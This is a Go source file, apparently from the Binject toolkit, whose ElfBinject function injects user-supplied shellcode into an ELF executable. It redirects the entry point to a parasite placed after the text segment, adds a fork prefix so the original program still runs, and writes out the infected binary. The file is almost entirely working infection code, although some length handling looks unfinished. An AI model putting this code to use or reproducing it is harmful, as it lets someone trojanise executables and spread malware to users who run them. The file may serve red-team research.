package bj

import (
	//"errors"
	"io/ioutil"
	"log"
	"sort"

	"github.com/Binject/debug/elf"
	"github.com/Binject/shellcode/api"
	//"github.com/Binject/shellcode/api"
)

// ElfBinject - Inject shellcode into an ELF binary
func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config *BinjectConfig) error {

	userShellCode, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		return err
	}

	elfFile, err := elf.Open(sourceFile)
	if err != nil {
		return err
	}

	//
	// BEGIN CODE CAVE DETECTION SECTION
	//

	if config.CodeCaveMode == true {
		log.Printf("Using Code Cave Method")
		caves, err := FindCaves(sourceFile)
		if err != nil {
			return err
		}
		for _, cave := range caves {
			for _, section := range elfFile.Sections {
				if cave.Start >= section.Offset && cave.End <= (section.Size+section.Offset) &&
					cave.End-cave.Start >= uint64(MIN_CAVE_SIZE) {
					log.Printf("Cave found (start/end/size): %d / %d / %d \n", cave.Start, cave.End, cave.End-cave.Start)
				}
			}
		}
	}
	//
	// END CODE CAVE DETECTION SECTION
	//


	PAGE_SIZE := uint64(4096)
	//scAddr := uint64(0)
	sclen := uint64(0)
	shellcode := []byte{}
	text_found := bool(false)

	//

	//text := uint64(0)        //unsigned long text;
	parasite_vaddr := uint64(0) //unsigned long parasite_vaddr;
	old_e_entry := uint64(0)    //unsigned long old_e_entry;
	end_of_text := uint64(0)    //unsigned int end_of_text;

	//for (i = e_hdr->e_phnum; i-- > 0; p_hdr++)
	for _, p := range elfFile.Progs {

		if text_found {
			p.Off += uint64(PAGE_SIZE)
		} else if p.Type == elf.PT_LOAD {

			if p.Flags == (elf.PF_R | elf.PF_X) {

				//text = p.Vaddr                      //  p_hdr->p_vaddr;
				parasite_vaddr = p.Vaddr + p.Filesz    //  p_hdr->p_vaddr + p_hdr->p_filesz;
				old_e_entry = elfFile.FileHeader.Entry // e_hdr->e_entry;
				elfFile.Entry = parasite_vaddr         // e_hdr->e_entry = parasite_vaddr;
				end_of_text = p.Off + p.Filesz         // p_hdr->p_offset + p_hdr->p_filesz;
				p.Filesz += sclen                      // p_hdr->p_filesz += parasite_size;
				p.Memsz += sclen                       // p_hdr->p_memsz += parasite_size;
				text_found = true

			}
		}
	}

	shellcode = api.ApplyPrefixForkIntel64(userShellCode, uint32(old_e_entry), elfFile.ByteOrder)
	//shellcode = api.ApplyPrefixForkIntel64(userShellCode, uint64(old_e_entry), elfFile.ByteOrder)

	// sheaders

	sortedSections := elfFile.Sections[:]
	sort.Slice(sortedSections, func(a, b int) bool { return elfFile.Sections[a].Offset < elfFile.Sections[b].Offset })
	for _, s := range sortedSections {
		if s.Offset >= end_of_text {
			s.Offset += PAGE_SIZE
		} else if s.Size+s.Addr == parasite_vaddr {
			s.Size += sclen
		}

		elfFile.SHTOffset += int64(PAGE_SIZE)

		break
	}

	// 5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
	//	into the file - text segment p_offset + p_filesz (original)
	elfFile.Insertion = shellcode

	return elfFile.Write(destFile)
}
